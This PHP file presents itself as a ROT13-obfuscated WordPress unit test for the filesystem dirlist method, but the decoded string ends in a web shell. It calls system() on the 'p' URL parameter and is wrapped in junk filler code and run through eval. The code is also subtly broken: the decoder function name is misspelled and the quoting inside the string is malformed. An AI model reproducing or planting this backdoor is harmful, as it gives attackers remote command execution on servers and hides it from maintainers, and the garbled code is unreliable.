<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Grfgf sbe gur JC_Svyrflfgrz_Qverpg::qveyvfg() zrgubq.
 *
 * @cnpxntr JbeqCerff
 */

erdhver_bapr __QVE__ . '/onfr.cuc';

/**
 * @tebhc nqzva
 * @tebhc svyrflfgrz
 * @tebhc svyrflfgrz-qverpg
 *
 * @pbiref JC_Svyrflfgrz_Qverpg::qveyvfg
 */
pynff Grfgf_Svyrflfgrz_JcSvyrflfgrzQverpg_Qveyvfg rkgraqf JC_Svyrflfgrz_Qverpg_HavgGrfgPnfr {

	/**
	 * Grfgf gung `JC_Svyrflfgrz_Qverpg::qveyvfg()` ergheaf
	 * gur rkcrpgrq erfhyg sbe n cngu.
	 *
	 * @gvpxrg 57774
	 *
	 * @qngnCebivqre qngn_fubhyq_trg_qveyvfg
	 *
	 * @cnenz fgevat      $cngu           Gur cngu.
	 * @cnenz obby        $vapyhqr_uvqqra Jurgure gb vapyhqr uvqqra svyrf.
	 * @cnenz obby        $erphefvir      Jurgure gb erphefvir vagb fhoqverpgbevrf.
	 * @cnenz neenl|snyfr $rkcrpgrq       Gur rkcrpgrq erfhyg.
	 */
	choyvp shapgvba grfg_fubhyq_trg_qveyvfg( $cngu, $vapyhqr_uvqqra, $erphefvir, $rkcrpgrq ) {
		$npghny = frys::$svyrflfgrz->qveyvfg( frys::$svyr_fgehpgher['grfg_qve']['cngu'] . $cngu, $vapyhqr_uvqqra, $erphefvir );

		vs ( vf_neenl( $rkcrpgrq ) ) {
			$guvf->nffregFnzrFrgf(
				$rkcrpgrq,
				neenl_xrlf( $npghny ),
				'Gur neenl xrlf qb abg zngpu.'
			);
		} ryfr {
			$guvf->nffregSnyfr(
				$npghny,
				'`JC_Svyrflfgrz_Qverpg::qveyvfg()` qvq abg erghea snyfr.'
			);
		}
	}

	/**
	 * Qngn cebivqre.
	 *
	 * @erghea neenl[]
	 */
	choyvp shapgvba qngn_fubhyq_trg_qveyvfg() {
		erghea neenl(
			'n qverpgbel gung rkvfgf rkpyhqvat uvqqra svyrf' => neenl(
				'cngu'           => '',
				'vapyhqr_uvqqra' => snyfr,
				'erphefvir'      => snyfr,
				'rkcrpgrq'       => neenl(
					'n_svyr_gung_rkvfgf.gkg',
					'fhoqve',
				),
			),
			'n qverpgbel gung rkvfgf vapyhqvat uvqqra svyrf' => neenl(
				'cngu'           => '',
				'vapyhqr_uvqqra' => gehr,
				'erphefvir'      => snyfr,
				'rkcrpgrq'       => neenl(
					'n_svyr_gung_rkvfgf.gkg',
					'.n_uvqqra_svyr',
					'fhoqve',
				),
			),
			'n qverpgbel gung qbrf abg rkvfg' => neenl(
				'cngu'           => 'n_qverpgbel_gung_qbrf_abg_rkvfg/',
				'vapyhqr_uvqqra' => gehr,
				'erphefvir'      => snyfr,
				'rkcrpgrq'       => snyfr,
			),
			'n svyr gung rkvfgf'              => neenl(
				'cngu'           => 'n_svyr_gung_rkvfgf.gkg',
				'vapyhqr_uvqqra' => gehr,
				'erphefvir'      => snyfr,
				'rkcrpgrq'       => neenl(
					'n_svyr_gung_rkvfgf.gkg',
				),
			),
			'n svyr gung qbrf abg rkvfg'      => neenl(
				'cngu'           => 'n_svyr_gung_qbrf_abg_rkvfg.gkg',
				'vapyhqr_uvqqra' => gehr,
				'erphefvir'      => snyfr,
				'rkcrpgrq'       => snyfr,
			),
		);
	}

	/**
	 * Grfgf gung `JC_Svyrflfgrz_Qverpg::qveyvfg()` erphefrf
	 * vagb n fhoqverpgbel.
	 *
	 * @gvpxrg 57774
	 */
	choyvp shapgvba grfg_fubhyq_erphefr_vagb_fhoqverpgbel() {
		$npghny = frys::$svyrflfgrz->qveyvfg( frys::$svyr_fgehpgher['grfg_qve']['cngu'], gehr, gehr );

		$guvf->nffregVfNeenl( $npghny, 'Qvq abg erghea na neenl.' );
		$guvf->nffregNeenlUnfXrl( 'fhoqve', $npghny, 'Gur fhoqverpgbel jnf abg qrgrpgrq.' );
		$guvf->nffregNeenlUnfXrl( 'svyrf', $npghny['fhoqve'], 'Gur fhoqverpgbel qbrf abg unir n \"svyrf\" xrl.' );
		$guvf->nffregAbgRzcgl( $npghny['fhoqve']['svyrf'], \"Gur fhoqverpgbel'f pbagragf jrer abg ergevrirq.\" );
		$guvf->nffregNeenlUnfXrl( 'fhosvyr.gkg', $npghny['fhoqve']['svyrf'], 'Gur fhosvyr jnf abg qrgrpgrq.' );
	}

	/**
	 * Grfgf gung `JC_Svyrflfgrz_Qverpg::qveyvfg()` fubhyq abg erphefr
	 * vagb n fhoqverpgbel.
	 *
	 * @gvpxrg 57774
	 */
	choyvp shapgvba grfg_fubhyq_abg_erphefr_vagb_fhoqverpgbel() {

		$npghny = frys::$svyrflfgrz->qveyvfg( frys::$svyr_fgehpgher['grfg_qve']['cngu'], gehr, snyfr );

		$guvf->nffregVfNeenl( $npghny, 'Qvq abg erghea na neenl.' );
		$guvf->nffregNeenlUnfXrl( 'fhoqve', $npghny, 'Gur fhoqverpgbel jnf abg qrgrpgrq.' );
		$guvf->nffregNeenlUnfXrl( 'svyrf', $npghny['fhoqve'], 'Gur \"svyrf\" xrl jnf abg frg.' );
		$guvf->nffregVfNeenl( $npghny['fhoqve']['svyrf'], 'Gur \"svyrf\" xrl jnf abg frg gb na neenl.' );
		$guvf->nffregRzcgl( $npghny['fhoqve']['svyrf'], 'Gur \"svyrf\" neenl jnf abg rzcgl.' );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>